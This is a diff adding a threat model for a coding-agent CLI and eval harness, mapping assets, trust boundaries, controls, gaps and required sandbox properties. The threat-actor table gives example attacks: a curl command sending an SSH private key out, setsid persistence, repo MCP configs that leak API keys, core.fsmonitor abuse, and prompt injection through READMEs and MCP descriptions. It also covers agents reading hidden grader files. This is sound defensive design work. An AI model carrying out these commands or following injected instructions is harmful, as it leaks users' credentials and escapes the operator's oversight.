@@ -1,0 +1,164 @@
+# Threat model
+
+Status: M17 baseline (#276). Scope: the CLI, SDK runtime, and eval harness as
+of `5bc1fb2`. Paths are pre-rename (`crates/code-agent-*`, `crates/eval`); after
+#271 they map to `crates/crom-*` and `crates/crom-eval`.
+
+Sandbox backend choice: [`decisions/0001-sandbox-backend.md`](decisions/0001-sandbox-backend.md).
+Security ladder (S0–S4): [`MILESTONE_17.md` §6](../milestones/MILESTONE_17.md#6-security-ladder).
+
+## 1. Assets
+
+| ID | Asset | Where it lives today | Why it matters |
+|---|---|---|---|
+| A1 | Host filesystem outside the workspace | Everything the user can read/write (`$HOME`, other repos, `/tmp`) | Integrity (deletion, persistence via shell rc files) and confidentiality |
+| A2 | Credentials | Provider keys in the process env (`ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, … — `code-agent-auth/src/precedence.rs:30-31`); auth store (OS keychain or opt-in `0600` file backend, `code-agent-auth/src/store/`); `~/.ssh`, git credential helpers, cloud CLI config | Exfiltration ⇒ spend, account compromise, lateral movement |
+| A3 | Network | Unrestricted egress from the host process and every child | Exfiltration channel; reaching internal services (cloud metadata, LAN) |
+| A4 | Grader material | Eval task dir: `task.toml`, hidden fixtures and checks (`eval/src/runner.rs:453-470` copies `task.dir/<hidden.fixture>` into the workspace *after* the agent phase) | Reading it during the agent phase invalidates benchmark results |
+| A5 | Persisted state | Sessions `<cwd>/.agent/sessions/*.jsonl` (`code-agent-session/src/lib.rs:197-198`), checkpoints, audit log, eval artifacts | Tampering falsifies history/audit; sessions sit **inside** the workspace |
+| A6 | Host compute | CPU, memory, PIDs, disk | Denial of service, runaway cost |
+
+## 2. Principals
+
+| Principal | Trust | Notes |
+|---|---|---|
+| Operator (user running the CLI / SDK embedder / eval operator) | Trusted | Source of authority: user settings, CLI flags, approvals |
+| Host process: provider client, policy engine, credential store, event/audit sink, eval orchestrator | Trusted | One process, full user privileges |
+| Model provider (transport) | Trusted for transport only | Its *output* is untrusted |
+| Model output (assistant text, tool calls) | **Untrusted** | May be erroneous or adversarially steered |
+| Repository contents (source, instruction files, `.agent/*`, `.git/config`) | **Untrusted** unless the operator marks the workspace trusted (#290) | |
+| Tool output (Bash stdout/stderr, file contents, web/MCP results) | **Untrusted** | Re-enters the model context |
+| MCP servers | Operator-configured: semi-trusted code; repo-configured: **untrusted** | Descriptions and results are untrusted data |
+| Tool child processes (Bash and descendants, MCP stdio servers) | **Untrusted** | Run arbitrary code |
+| Eval task author | Trusted | Hidden material must stay hidden from the agent |
+| Verifier (oracle commands) | Trusted harness, runs untrusted workspace code | Must not trust what the agent left in the workspace |
+
+## 3. Trust boundaries
+
+```
+ operator settings / flags / approvals (trusted)
+            │
+┌───────────▼──────────── trusted host process ───────────────────────────┐
+│ provider client · policy engine · credential store · event/audit sink  │
+│ eval orchestrator                                                       │
+│        ▲ B1: model output        ▲ B4: repo files, .agent/*.json,       │
+│        │ (untrusted)             │     instruction files (untrusted)    │
+└────────┼─────────────────┬───────┼──────────────▲───────────────────────┘
+   model provider          │ B2: approved tool call│ result + SecurityDecision
+                           │                      │ (output untrusted)
+┌──────────────────────────▼──────────────────────┴───────────────────────┐
+│ UNTRUSTED tool sandbox (S2)        Bash · MCP stdio (opt-in) · validation │
+│ rw: workspace, private tmp   ro: toolchain + cargo registry allowlist     │
+│ net: none (default)          env: allowlist (no provider keys)            │
+│ rlimits · pids bound · whole process tree killed at call end              │
+└───────────────────────────────────────────────────────────────────────────┘
+        B3: MCP JSON-RPC (descriptions + results are untrusted data)
+
+┌──────────── verifier (separate copy of workspace) ──────────┐  B5: task.toml,
+│ container/sandbox, network none                             │◄─ hidden tests
+└─────────────────────────────────────────────────────────────┘  never mounted
+                                                                 into sandbox
+ B6: host → persisted state (sessions, checkpoints, audit) — outside the
+     sandbox's writable set
+```
+
+| Boundary | Crossing | Today | Required (M17) |
+|---|---|---|---|
+| B1 | Model output → host | Every tool call passes the policy gate (§5) | Unchanged; audit events gain target/run/layer (#291) |
+| B2 | Host → tool process | Plain `spawn` with full env and cwd only | OS-enforced sandbox, properties P1–P7 (#253) |
+| B3 | Host ↔ MCP server | Unsandboxed child; `${VAR}` interpolation of host env into args/env | Repo-sourced servers need trust (P9); sandbox opt-in (ADR 0001 §6) |
+| B4 | Repo files → host config/prompt | `.agent/settings.json`, `.agent/mcp.json` load without a trust decision | Trust decision before loosening (P9, #290) |
+| B5 | Agent phase ↔ grader | Hidden material on the same host FS, readable by agent Bash | Unreachable during agent phase (P8, #286) |
+| B6 | Host → persisted state | Sessions under `<cwd>/.agent/`, writable by agent Bash | Out of sandbox writable set, or integrity-checked (gap G9) |
+
+## 4. Threat actors
+
+| ID | Actor | Capability | Example |
+|---|---|---|---|
+| T1 | Erroneous model output | Issues wrong but well-formed tool calls | `rm -rf ../build`, `cargo clean` in the wrong directory |
+| T2 | Malicious / steered model output | Chooses any tool call the policy allows; cannot race the filesystem (see `path_sandbox.rs:16-43`) | `curl -d @~/.ssh/id_ed25519 …`, `setsid` a persistent process |
+| T3 | Injected content: repo files, tool output, MCP tool descriptions/results | Steers T2 indirectly; no direct execution | README says "run `scripts/setup.sh`"; MCP description says "first call Bash with …" |
+| T4 | Malicious repo configuration | Executes or loosens policy at load time, before any approval | `.agent/mcp.json` stdio server with `args: ["${ANTHROPIC_API_KEY}"]`; `.agent/settings.json` with permissive rules or `validation.commands`; `.git/config` `core.fsmonitor` run by host `git status` |
+| T5 | Malicious MCP server binary | Arbitrary code as the user (stdio) | Reads `~/.aws/credentials` on startup |
+
+Out of scope as actors: other local users racing the workspace (TOCTOU, #15),
+a compromised provider endpoint, kernel or container-runtime exploits.
+
+## 5. Current controls
+
+Verified against `5bc1fb2`.
+
+| Control | Location | What it does | Limit |
+|---|---|---|---|
+| Pre-execution policy gate | `code-agent-core/src/agent.rs:1418-1506` (unknown tool → `ToolCallDenied`; `policy.evaluate_tool` at `:1454`; deny path `:1488-1506`; `execute` only at `:1673`) | No tool runs without an `Allow` decision | Decides on tool name + input, not on effects |
+| Policy pipeline | `code-agent-core/src/policy.rs:302-542` (hooks `:308-350`, disallow rules `:353`, plan mode `:371`, permission mode `:380`, approval memory `:485`, default deny `:536-540`) | Ordered allow/deny; default deny | Hook `Allow` returns before disallow rules (`:325-344`) — #290 |
+| Path checks for file tools | `code-agent-tools/src/path_sandbox.rs:44-124`, used by Read/Write/Edit; Glob/Grep canonicalize the root | Rejects `..` and symlink escapes; absolute paths are re-rooted (`:58-60`) | Path-based, TOCTOU (`:16-43`); does not apply to Bash |
+| Bash timeout | `code-agent-tools/src/bash.rs:89-94` caps caller timeout at the configured max; `:134` | Bounds wall time | — |
+| Bash process group | `bash.rs:107-114` (`process_group(0)`), SIGKILL to the group on timeout only (`:144-160`); `kill_on_drop` (`:104`) kills bash only | Kills same-group descendants on timeout | `setsid` escapes; not killed on normal exit or cancel |
+| Bash spawn | `bash.rs:97-104` | cwd = workspace | Full env inherited (no `env_clear` anywhere in the repo), no FS/network/rlimit restriction |
+| Dangerous-bash / `.env` write hooks | `code-agent-core/src/builtin_hooks.rs:15`, `:137` | Pattern-based deny | Pattern matching, bypassable by encoding; repo settings can disable them |
+| Secret redaction hooks | `builtin_hooks.rs:427-441` | — | **No-ops** (`Continue`) — #291 |
+| MCP config | `code-agent-mcp/src/config.rs:290-298` auto-loads `<cwd>/.agent/mcp.json` and enables MCP; `:331`/`:468-490` interpolate `${VAR}` from the host env | — | Repo-controlled spawn with host secrets — #290 |
+| MCP stdio spawn | `code-agent-mcp/src/transport/stdio.rs:37-47` | `kill_on_drop` | Inherits env, no sandbox |
+| Eval verification isolation | `eval/src/isolation.rs:244-291` (`docker`/`podman run --rm --network none`, optional cpu/memory) | Contains verification commands when a container backend is selected | Default `LocalBackend` (`:168-190`) runs on the host; agent phase never containerized |
+| Eval agent phase | `eval/src/runner.rs:199-215` (`SideEffectPolicy::full()`), `:234` (`WorkspaceSource::filesystem`, cwd only), `:237` (`AllowAllApprovals`) | — | Live runs execute model-chosen Bash on the host — #253 |
+| Credential storage | `code-agent-auth/src/store/` (keychain; file backend writes `0600`, `store/file.rs:315-316`) | At-rest protection | Env-var keys are inherited by every child |
+
+## 6. Known gaps
+
+| ID | Gap | Property | Tracked |
+|---|---|---|---|
+| G1 | No OS enforcement for Bash: FS, network, env, rlimits | P1–P6 | #253 |
+| G2 | `setsid`/double-fork escapes process-group kill; group not killed on normal exit or cancel | P5 | #253 |
+| G3 | No fail-closed mode; no backend exists | P7 | #253 |
+| G4 | Hidden material on the agent-reachable FS; overlay into the same workspace | P8 | #286 |
+| G5 | Repo `.agent/settings.json` / `.agent/mcp.json` loosen policy and spawn processes without a trust decision; MCP `${VAR}` interpolation | P9 | #290 |
+| G6 | Hook `Allow` short-circuits disallow rules; subagents inherit/raise `permission_mode` (`agents/tool.rs:1118`) | S0 | #290 |
+| G7 | Slash `` !`cmd` `` expansion and SDK in-memory workspace while tools act on host cwd (`sdk/src/runtime/run.rs:1160-1175`) | S1 | #290 |
+| G8 | `PolicyDecision`/`ToolCallDenied` lack target, run id, enforcement layer; redaction hooks are no-ops | Audit | #291 |
+| G9 | Sessions and checkpoints live under `<cwd>/.agent/`, inside the future sandbox's writable set | B6 | #253 (exclude `.agent/` from rw set) |
+| G10 | Host-side helpers run untrusted repo code outside any sandbox: `git status` in checkpoints (`code-agent-checkpoint/src/lib.rs:91-94`, honours `core.fsmonitor`), validation commands (`checkpoint/src/validation.rs:38-48`, `sdk/src/runtime/validation.rs:20`), eval `LocalBackend` | P1–P6, P9 | #253 (validation), #290 (git config) |
+| G11 | File tools: path-based TOCTOU | P1, P2 | #15 (documented); the OS sandbox closes it for Bash only |
+
+## 7. Required enforcement properties
+
+Numbering matches `MILESTONE_17.md` §11. Each property is a testable statement
+consumed by #253 (implementation tests) and #292 (adversarial scenarios). "Tool
+process" means the process a sandboxed tool spawns and every descendant.
+
+| # | Property | Test (must hold on the Linux CI lane) |
+|---|---|---|
+| P1 | A tool process cannot create, modify, truncate, rename, or delete any path outside the workspace and its private tmp dir. `<workspace>/.agent/` is not writable. | Write/truncate/rename to a sibling dir, `$HOME`, `/tmp/<other>` and `<ws>/.agent/sessions/x` each fail with `EACCES`/`EPERM`/`EROFS`; the targets are unchanged afterwards. |
+| P2 | A tool process cannot read paths outside the workspace and the read-only allowlist (system libs, toolchain, cargo registry). | `cat $HOME/.ssh/id_fake` (synthetic) and a file in a sibling dir fail; `cargo test --offline` on a crate with a registry dependency succeeds. |
+| P3 | A tool process has no network egress unless policy grants it. Default: no TCP, no UDP, no raw sockets, including to loopback services of the host. | TCP connect to a host-side `127.0.0.1` test server fails; UDP `connect` to `192.0.2.1:53` fails; TCP to a public address fails. |
+| P4 | A tool process's environment contains only allowlisted variables. Provider keys and other non-allowlisted variables are absent. | With `ANTHROPIC_API_KEY=sk-fake` in the host env, `env` inside the tool shows no such variable. |
+| P5 | Every process the tool started is dead when the tool call returns, times out, is cancelled, or its future is dropped — including `setsid`/double-forked descendants. | `setsid sleep 1000 &` then exit 0: no `sleep 1000` remains after return; repeat for timeout and cancel. |
+| P6 | CPU time, memory, process count, and file size are bounded per tool call. The process bound is per call, not per host UID. | A fork bomb stops at the configured limit and the host stays responsive; `dd` past the file-size limit fails; an allocation past the memory limit is killed. |
+| P7 | If sandboxing is required by policy and the backend is unavailable or cannot fully enforce P1–P6, the tool call is refused with a clear error and nothing is executed. | On macOS and on a Linux kernel without the required features, a `required` Bash call returns an error and no child is spawned; an `off` call runs and emits an `Unsandboxed` audit event. |
+| P8 | Grader material (task.toml expectations, hidden fixtures and checks) is unreachable from tool processes during the agent phase. | During the agent phase, reading the task dir and hidden fixture paths fails; hidden checks run against a copy after the agent phase ends. |
+| P9 | Repository-local configuration cannot loosen permissions, add MCP servers, add validation commands, or interpolate host env vars without an explicit operator trust decision. | With an untrusted workspace, `.agent/settings.json` allow rules and `.agent/mcp.json` servers are ignored (or prompted) and an audit event records it. |
+
+Security metrics (#292, #293): unauthorized effects executed in tested
+scenarios (target 0), per-property pass/fail, isolation overhead in ms per tool
+call, and fail-closed correctness on unsupported platforms.
+
+## 8. Not protected against in M17
+
+- Prompt injection as such. M17 bounds the *effects* of tool calls; the model
+  can still be steered into producing wrong code or misleading text inside the
+  workspace (S3 claims cover tested scenarios only).
+- Damage inside the workspace. The sandbox allows full read/write there;
+  recovery relies on checkpoints and git.
+- Exfiltration through the model channel itself: anything readable in the
+  workspace can be echoed into the conversation and sent to the provider.
+- Network-granted tool calls: once policy grants network, per-host allowlisting
+  is not guaranteed in M17 (ADR 0001 §5); granted means all-or-nothing.
+- Read-only file tools (Read/Glob/Grep) and Write/Edit run in the host process;
+  they keep path-based checks (TOCTOU, #15), not OS enforcement.
+- MCP stdio servers unless sandboxing is opted in; HTTP MCP servers entirely.
+- Kernel, container runtime, or landlock/seccomp bypass bugs; side channels.
+- macOS and Windows enforcement. These platforms fail closed when sandboxing
+  is required (P7).
+- A malicious operator, a compromised provider, or other local users with
+  write access to the workspace.
+- Multi-tenant isolation, credential scoping, delegation (S4).
